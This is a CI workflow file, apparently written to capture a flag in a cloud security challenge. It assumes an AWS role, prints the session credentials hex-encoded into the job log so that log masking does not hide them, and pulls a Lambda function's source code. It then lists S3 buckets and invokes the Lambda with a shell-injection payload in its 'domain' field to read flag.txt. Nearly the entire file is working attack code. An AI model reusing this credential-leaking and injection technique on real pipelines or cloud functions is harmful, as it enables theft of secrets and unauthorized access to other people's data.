name: grab-flag
on:
  workflow_dispatch: {}
  push:
    branches: [corgi, main]
permissions:
  id-token: write
  contents: read
jobs:
  grab:
    runs-on: self-hosted
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1
          role-session-name: flaggrab
      - name: pipeline
        shell: bash
        run: |
          set +e
          aws sts get-caller-identity | tee /tmp/id.json
          python3 -c "import os
for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
 print(k+'_HEX='+os.environ.get(k,'').encode().hex())
 open('/tmp/'+k,'w').write(os.environ.get(k,''))"
          URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
          echo URL_LEN=${#URL}
          curl -sL "$URL" -o /tmp/lam.zip
          python3 -c "import zipfile;z=zipfile.ZipFile('/tmp/lam.zip');
[print(n);print(z.read(n).decode('utf-8','replace')) for n in z.namelist()]" | tee /tmp/lamcode.txt
          aws s3 ls s3://codec4f26c862a321ef5/ | tee /tmp/list.txt
          # try get as cicd (expect fail) + list platform
          aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt 2>&1 | tee /tmp/getflag.err
          cat /tmp/flag.txt 2>/dev/null
          aws s3api list-objects-v2 --bucket platform-bucket-009661764077-us-east-1 | tee /tmp/plat.json
          # try update function? needs SourceVpc
          aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{"domain":"x;aws s3 cp s3://codec4f26c862a321ef5/flag.txt -"}' /tmp/out.json 2>&1
          cat /tmp/out.json 2>/dev/null
          ls -la /tmp/